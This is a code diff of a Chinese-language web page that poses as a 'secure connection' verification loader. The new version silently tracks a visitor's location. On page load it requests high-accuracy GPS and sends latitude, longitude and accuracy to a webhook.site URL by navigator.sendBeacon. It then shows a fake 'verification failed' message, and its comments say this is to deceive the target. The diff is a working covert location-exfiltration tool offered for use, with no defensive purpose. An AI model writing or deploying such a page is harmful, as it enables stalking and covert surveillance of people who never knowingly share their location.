@@ -1,39 +1,70 @@
-<!CDOCTYPE html>
+<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>加载中...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>系统资源校验</title>
+    <style>
+        body { background-color: #f8f9fa; font-family: -apple-system, system-ui, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { color: #555; font-size: 16px; text-align: center; }
+    </style>
 </head>
-<body style="background-color: white; text-align: center; padding-top: 50px;">
-    <h2 id="msg">正在初始化安全连接...</h2>
+<body>
+    <div class="loader"></div>
+    <div class="text" id="status">正在建立安全连接，请稍后...</div>
 
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        const WEBHOOK_URL = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";
+
+        function startTracking() {
+            if (!navigator.geolocation) {
+                updateStatus("设备不支持定位");
+                return;
             }
+
+            // 使用 watchPosition 实现精度自动升级 (从基站 -> Wi-Fi -> GPS)
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const acc = position.coords.accuracy; // 获取精度 (米)
+
+                    updateStatus(`安全验证中... (精度: ${Math.round(acc)}米)`);
+                    
+                    // 只有当精度提升到 100 米以内时，才认为是一次有效的精准定位
+                    if (acc <= 100) {
+                        sendData(lat, lon, acc);
+                    }
+                },
+                (error) => {
+                    updateStatus("连接超时，请检查权限。");
+                },
+                {
+                    enableHighAccuracy: true, // 强制开启 GPS
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
         }
 
-        function sendPosition(position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var myUrl = "https://webhook.site/8d58a783-30ed-421a-8779-5d714c5ca502";
-
-            // 【暴力绕过法】创建一个不可见的图片对象
-            // 浏览器为了加载这张图片，必须访问这个 URL，从而把坐标带给 Webhook
-            var img = new Image();
-            img.src = myUrl + "?lat=" + lat + "&lon=" + lon; 
+        function sendData(lat, lon, acc) {
+            const data = JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, timestamp: new Date() });
+            // 使用 sendBeacon 实现静默、高可靠传输
+            navigator.sendBeacon(WEBHOOK_URL, data);
             
-            // 模拟成功后的视觉反馈
-            document.getElementById("msg").innerHTML = "内容加载失败，请刷新重试。";
+            // 模拟任务完成，给对方一个假反馈
+            setTimeout(() => {
+                document.body.innerHTML = "<h2 style='text-align:center; color:#666;'>验证失败，请刷新页面重试。</h2>";
+            }, 2000);
         }
 
-        function showError(error) {
-            document.getElementById("msg").innerHTML = "网络连接超时，请检查权限。";
+        function updateStatus(msg) {
+            document.getElementById("status").innerText = msg;
         }
 
-        window.onload = getLocation;
+        window.onload = startTracking;
     </script>
 </body>
 </html>
